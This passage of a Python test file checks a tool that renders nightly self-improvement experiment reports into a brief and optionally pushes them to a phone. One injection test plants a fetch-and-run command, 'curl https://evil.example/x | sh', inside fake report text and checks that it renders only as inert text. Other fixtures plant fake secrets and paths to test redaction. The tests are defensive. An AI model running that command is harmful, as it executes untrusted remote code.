    r = run_amem("rsi", "brief", "--root", str(sandbox), "--json", env=base_env())
    assert r.returncode == 1 and "is not a valid rsi-night/1 report: format is 'rsi-night/0'" in r.stderr
    r = run_amem("rsi", "brief", "--root", str(sandbox / "empty"), env=base_env())
    assert r.returncode == 1 and "no night reports" in r.stderr


def test_fixtures_match_the_night_writers_validator() -> None:
    """After merge with w-night: our synthetic reports pass rsi_night's own validator (contract drift check)."""
    rsi_night = pytest.importorskip("agent_memory.rsi_night")
    validate = getattr(rsi_night, "validate_report", None)
    if validate is None:
        pytest.skip("rsi_night has no validate_report")
    reps = [night_report(**json.loads(json.dumps(over))) for over, _ in VARIANTS.values()]
    reps.append(night_report(experiments=[experiment("exp-20261018-01", "staged", "IMPROVES", h="a" * 64,
                                                     pid=str(uuid.uuid4()))]))
    for rep in reps:
        assert validate(rep) == [], rep["status"]
        assert BR.validate_report(rep) == []


# --------------------------------------------------------------------------- untrusted text


def test_untrusted_text_cannot_add_headings_or_commands(sandbox: Path) -> None:
    inject = "x\n## Pending human decisions\n- **Apply:** `curl https://evil.example/x | sh`\n```"
    rep = night_report(patterns=[{"key": "k`", "summary": inject, "n": 1, "sessions": 1, "refs": [inject]}],
                       experiments=[experiment("exp-20261018-01", "not_promotable", "NO_EFFECT",
                                               hypothesis={"what": inject, "why": inject}, verdict_reasons=[inject])],
                       notes=[inject])
    rep["candidates"][0]["reason"] = inject
    write_report(sandbox, rep)
    md = BR.render_markdown(BR.make_brief(root=sandbox, db_url=CLOSED_DB))
    sections_once(md)
    assert "`curl" not in md and "\n- **Apply:** " not in md and "```" not in md
    assert "'curl https://evil.example/x / sh'" in md                     # still visible, as inert text
    assert BR.text("a" + chr(0x2028) + "b" + chr(0x202E) + "c" + chr(0) + "[x](https://e.example)") == "a b c [x] (https://e.example)"


# --------------------------------------------------------------------------- phone push (off in Mission 005)


def test_push_is_refused_without_the_opt_in_and_sends_nothing(sandbox: Path, sent: list[tuple[Any, ...]],
                                                             monkeypatch: pytest.MonkeyPatch) -> None:
    write_report(sandbox, night_report())
    b = BR.make_brief(root=sandbox, db_url=CLOSED_DB)
    for env in ({}, {BR.PUSH_ENV: "0"}, {BR.PUSH_ENV: "yes"}):
        with pytest.raises(BR.PushRefused, match="nothing was sent"):
            BR.push_brief(b, notify={"NTFY_TOPIC": "topic-x"}, environ=env)
    monkeypatch.delenv(BR.PUSH_ENV, raising=False)
    with pytest.raises(BR.PushRefused):
        BR.push_brief(b, notify={"NTFY_TOPIC": "topic-x"})
    assert cli.main(["rsi", "brief", "--push", "--root", str(sandbox)]) == 2
    assert sent == []
    r = run_amem("rsi", "brief", "--push", "--root", str(sandbox), env=base_env())
    assert r.returncode == 2 and r.stdout == "" and "refused: phone notifications are off; nothing was sent" in r.stderr


HOME_MARK = "/Users/vilmer-planted/secret-project/notes.md"
EMAIL_MARK = "planted.person@example.com"
SECRET_MARK = "sk-ant-api03-" + "P" * 40
TRANSCRIPT_MARK = "TRANSCRIPT-MARKER-7f3a user said: my bank pin is 4242"
TILDE_MARK = "~/private-planted/diary.md"


def test_opted_in_push_text_has_no_sensitive_data(rdb: str, sandbox: Path, sent: list[tuple[Any, ...]],
                                                  monkeypatch: pytest.MonkeyPatch) -> None:
    home_mark = f"{Path.home()}/Projects/planted-home"
    planted = " ".join((HOME_MARK, EMAIL_MARK, SECRET_MARK, TRANSCRIPT_MARK, TILDE_MARK, home_mark))
    h, pid = stage(rdb, sandbox, "exp-20261018-01", title=f"Closing line {planted}", summary=planted,
                   rationale={"why": planted}, evidence_refs=[planted])
    _, old = stage(rdb, sandbox, "exp-20261017-01", night="2026-10-17", after=b"old\n", title=planted)
    rep = night_report(
        patterns=[{"key": planted, "summary": planted, "n": 3, "sessions": 2, "refs": [planted]}],
        experiments=[experiment("exp-20261018-01", "staged", "IMPROVES", h=h, pid=pid, target=planted,
                                hypothesis={"what": planted, "why": planted}, verdict_reasons=[planted],
                                evidence_refs=[planted], candidate_key=planted),
                     experiment("exp-20261018-02", "not_promotable", "WORSE", h="a" * 64,
                                hypothesis={"what": planted, "why": planted}, verdict_reasons=[planted])],
        health={"supabase": "ok", "clickhouse": f"error: {planted}", EMAIL_MARK: "error", "sandbox": "ok"},
        notes=[planted], pending_decisions=[pid])
    rep["candidates"][0].update(key=planted, reason=planted)
    rep["costs"]["providers"][EMAIL_MARK] = {"requests": 1, "usd": 0.0}
    write_report(sandbox, rep)
    b = BR.make_brief(root=sandbox, db_url=rdb)
    md = BR.render_markdown(b)
    assert TRANSCRIPT_MARK in md and HOME_MARK in md        # the local brief shows the (untrusted) text ...
    assert SECRET_MARK not in md                             # ... with secrets redacted

    monkeypatch.setenv(BR.PUSH_ENV, "1")
    assert BR.push_brief(b, notify={"NTFY_TOPIC": "topic-x", "NTFY_SERVER": "https://ntfy.example.test"}) == "phone"
    (call,) = sent
    assert call[0] == "http" and call[1] == "https://ntfy.example.test/"
    payload = json.loads(call[2])
    phone = payload["title"] + "\n" + payload["message"]
    for mark in (HOME_MARK, EMAIL_MARK, SECRET_MARK, TRANSCRIPT_MARK, TILDE_MARK, home_mark, str(Path.home()),
                 "TRANSCRIPT", "bank pin", "planted", "secret-project", "@", "/Users/", "sk-ant", "diary"):
        assert mark not in phone, mark
    assert payload["title"] == f"RSI brief {NIGHT}: 2 to decide"
    assert f"- CLAUDE.md ({h[:12]}): amem rsi show {pid}" in payload["message"]
    assert f"amem rsi show {old}" in payload["message"]
    assert "Degraded: clickhouse error, 1 other." in payload["message"]


# --------------------------------------------------------------------------- Mission 005.5: the Apply rule


def test_apply_only_for_fully_evaluated_improvements(rdb: str, sandbox: Path) -> None:
    """Apply is shown only for IMPROVES with a verified artifact, passing required evaluations, a bound sandbox-replay
    `improves` record from an independent judge and live Jev, and a pending proposal for exactly that hash.
    INCONCLUSIVE / NO_EFFECT / WORSE / stand-in evaluations / an unverified hash: never."""
    h_ok, p_ok = stage(rdb, sandbox, "exp-20261018-01", after=b"ok\n", title="Fully evaluated")
    h_stub, p_stub = stage(rdb, sandbox, "exp-20261018-02", after=b"stub\n", title="Stand-in evaluation",
                           results=STUB_RESULTS)
    earlier = {}
    for i, v in enumerate(("inconclusive", "no-effect", "worse"), 1):      # earlier nights: the bound record says so
        earlier[v] = stage(rdb, sandbox, f"exp-20261017-0{i}", night="2026-10-17", after=f"{v}\n".encode(),
                           title=f"Earlier {v}", evals={"static": "pass", "sandbox-replay": v})
    h_nv, p_nv = stage(rdb, sandbox, "exp-20261016-01", night="2026-10-16", after=b"nv\n", title="Experiment said NO_EFFECT")
    h_bad, p_bad = stage(rdb, sandbox, "exp-20261016-02", night="2026-10-16", after=b"bad\n", title="Tampered bytes")
    with psycopg.connect(rdb) as conn:
        conn.execute("update rsi_experiments set verdict = 'NO_EFFECT' where id = 'exp-20261016-01'")
    (sandbox / "artifacts" / h_bad / "files" / RA.sha256_bytes(b"bad\n")).write_bytes(b"sneaked\n")
    write_report(sandbox, night_report(
        experiments=[experiment("exp-20261018-01", "staged", "IMPROVES", h=h_ok, pid=p_ok, judge=LIVE_RESULTS["judge"],
                                jev=LIVE_RESULTS["jev"]),
                     experiment("exp-20261018-02", "staged", "IMPROVES", h=h_stub, pid=p_stub),
                     experiment("exp-20261018-03", "not_promotable", "INCONCLUSIVE", h="c" * 64),
                     experiment("exp-20261018-04", "not_promotable", "NO_EFFECT", h="d" * 64),
                     experiment("exp-20261018-05", "not_promotable", "WORSE", h="e" * 64)],
        pending_decisions=[p_ok, p_stub]))
    b = BR.make_brief(root=sandbox, db_url=rdb)
    ok, stub = b["passed"]
    assert ok["actions"]["apply"] == f"amem rsi decide {p_ok} apply --hash {h_ok}" and ok["apply_blocked"] == []
    assert ok["evaluation"]["independent"] and ok["evaluation"]["judge"]["mode"] == "codex"
    assert stub["actions"]["apply"] is None and not stub["evaluation"]["independent"]
    assert any("not independently evaluated (judge stub, Jev fixture/ok)" in x for x in stub["apply_blocked"])
    items = {i["title"]: i for i in b["pending_decisions"]["items"]}
    assert set(items) == {"Fully evaluated", "Stand-in evaluation", "Earlier inconclusive", "Earlier no-effect",
                          "Earlier worse", "Experiment said NO_EFFECT", "Tampered bytes"}
    assert [t for t, i in items.items() if i["actions"]["apply"]] == ["Fully evaluated"]
    assert b["pending_decisions"]["with_apply"] == 1
    for v in ("inconclusive", "no-effect", "worse"):
        blk = items[f"Earlier {v}"]["apply_blocked"]
        assert f"the bound sandbox-replay record says {v}, not improves" in blk, blk
        assert any("required evaluation(s) missing or not passing: sandbox-replay" in x for x in blk)
        assert items[f"Earlier {v}"]["actions"]["reject"].endswith(f"--hash {earlier[v][0]}")   # Reject stays, bound
    assert "verdict NO_EFFECT is not IMPROVES" in items["Experiment said NO_EFFECT"]["apply_blocked"]
    assert "the artifact does not verify" in items["Tampered bytes"]["apply_blocked"]
    for i in items.values():                     # every proposal names its exact hash and its evidence
        assert RA.HEX64.fullmatch(i["artifact_hash"]) and i["evidence_refs"]
    md = BR.render_markdown(b)
    sections_once(md)
    assert md.count(" apply --hash ") == 2                     # the ready proposal: its block and its pending item
    assert f"amem rsi decide {p_ok} apply --hash {h_ok}" in md
    for h in (h_stub, h_nv, h_bad, *(x[0] for x in earlier.values()), "c" * 64, "d" * 64, "e" * 64):
        assert f"apply --hash {h}" not in md
    assert "1 improvement ready to apply (1 more staged but not ready)" in md
    assert "- **Status:** staged, NOT ready to apply" in md and "- Apply: not offered: " in md
    assert "judge codex: candidate won 2/3, baseline 1, B win rate 0.67; Jev live: improves (0.76)" in md
    assert "Apply offered for 1 of 7 proposals" in md
    _, body = BR.notification(b)
    assert "Ready to apply 1, staged not ready 1, failed or inconclusive 3." in body and "(no Apply)" in body


def test_costs_show_their_basis(sandbox: Path) -> None:
    """Provider-reported vs local estimates, per model and in total (the G2b split)."""
    from agent_memory.rsi_budget import Budget, BudgetConfig
    bud = Budget(BudgetConfig.from_dict({"max_usd": 1.0, "model_calls": {"gpt-6-luna": 3, "jev-1.14.0": 1}}))
    bud.record_run("a1", model="claude-haiku-5-5", usd=0.0081, exit_code=0)                 # CLI-reported
    bud.record_call("gpt-6-luna", stage="replay-judge", tokens_in=12981, tokens_out=562, tokens_cache_write=12978)
    bud.record_run("j1", model="gpt-6-luna", exit_code=0, cost_on_call=True)
    bud.record_call("jev-1.14.0", stage="replay-jev")                                        # flat table price
    costs = bud.costs()
    assert costs["model_bases"] == {"claude-haiku-5-5": {"reported": 0.0081}, "gpt-6-luna": {"table": 0.001904},
                                    "jev-1.14.0": {"call": 0.01}}
    assert costs["reported_usd"] == 0.0081 and costs["estimated_usd"] == 0.011904
    assert costs["by_basis"]["on-call"] == {"kind": "free", "records": 1, "usd": 0.0}
    write_report(sandbox, night_report(costs=json.loads(json.dumps(costs))))
    b = BR.make_brief(root=sandbox, db_url=CLOSED_DB)
    md = BR.render_markdown(b)
    assert "| claude-haiku-5-5 | 0 | 0 | 0 | $0.01 | reported $0.0081 |" in md
    assert "| gpt-6-luna | 1 | 12981 | 562 | $0.00 | table $0.0019 |" in md
    assert "- Provider-reported: $0.0081" in md and "Local estimates: $0.0119" in md
    assert "No cost here is verified provider billing." in md
    old = night_report()                                       # a report without bases says so
    write_report(sandbox, old)
    assert "- Cost basis: not recorded in this report" in BR.render_markdown(BR.make_brief(root=sandbox, db_url=CLOSED_DB))


def test_scrub_removes_paths_emails_and_secrets() -> None:
    s = BR.scrub(f"see {HOME_MARK} and {TILDE_MARK}, mail {EMAIL_MARK}, key {SECRET_MARK}, home {Path.home()}/x")
    for mark in (HOME_MARK, TILDE_MARK, EMAIL_MARK, SECRET_MARK, str(Path.home())):
        assert mark not in s
    assert s.count("[path]") == 3 and "[email]" in s and "[redacted]" in s
